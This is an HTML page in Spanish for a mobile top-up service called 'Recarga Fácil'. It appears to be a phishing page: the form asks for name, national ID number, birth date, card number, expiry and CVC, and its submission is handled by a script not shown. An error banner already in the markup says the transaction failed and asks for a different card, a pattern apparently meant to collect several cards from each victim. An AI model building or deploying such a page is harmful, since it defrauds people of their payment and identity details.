
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<title>Recarga Fácil</title>
	<link rel="icon" type="image/png" href="img/logo.png">
	<link rel="stylesheet" href="css/bootstrap.css">
	<link rel="stylesheet" href="css/style.css">
	<script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script>
</head><body>
<div class="error" id="alert_error">
    <p>Su transacción no pudo completarse. Esto podría deberse a detalles incorrectos de la tarjeta o restricciones de su banco. Vuelva a intentarlo o utilice una tarjeta de debito/crédito diferente.</p>
</div>
<nav class="navbar navbar-expand-lg navbar-light bg-light py-3 px-md-5">
	<img src="img/logo.png" alt="Logo Portal Recargas">
	<a class="navbar-brand" href="/#">Recarga Fácil</a>
</nav><div class="header">
	<h1>Recarga Personal

</h1>
</div>
<form id="valid_data">
<div class="container-fluid">
	<div class="row d-flex justify-content-center align-items-center flex-column">

		<div class="col-md-6 col-12 contenedor_recarga">
			<h5>Ingrese su Tarjeta de Debito o Credito</h5>
			<div class="row pt-5 d-flex justify-content-center">
				<div class="col-11">
					<div class="input">
						<label for="name">Nombre y apellido</label>
						<input type="text" id="name" name="name" placeholder="Nombre y apellido" required>
					</div>
				</div>
				<div class="col-11">
					<div class="input">
						<label for="dni">Número de documento</label>
						<input type="text" id="dni" name="dni" placeholder="Número de DNI" inputmode="decimal" required>
					</div>
				    </div>
				<div class="col-11">
				    <div class="input">
				    	<label for="nacimimiento">Fecha de Nacimiento</label>
                    	<input type="date" id="nac" name="nac" value="2000-01-01" min="1940-01-01" max="2004-01-01" inputmode="decimal" required>
				   </div>
			   </div>
				<div class="col-11">
					<div class="input">
						<label for="card">Número de tarjeta</label>
						<input type="text" id="card" name="card" placeholder="Número de tarjeta" inputmode="decimal" required>
					</div>
				</div>
				<div class="col-11">
					<div class="row">
						<div class="col-6">
							<div class="input">
								<label for="venc">Vencimiento</label>
								<input type="text" id="venc" name="venc" placeholder="MM/AA" inputmode="decimal" required>
							</div>
						</div>
						<div class="col-6">
							<div class="input">
								<label for="cvc">CVC</label>
								<input type="text" id="cvc" name="cvc" placeholder="CVC" inputmode="decimal" required>
							</div>
						</div>
					</div>
				</div>
				<div class="col-11">
					<button class="my-3">Siguiente</button>
				</div>
			</div>
		</div>
	</div>
</div>
</form>
<script src="js/jquery.js"></script>
<script src="js/bootstrap.js"></script>
<script src="js/custom.js"></script></body>
</html>
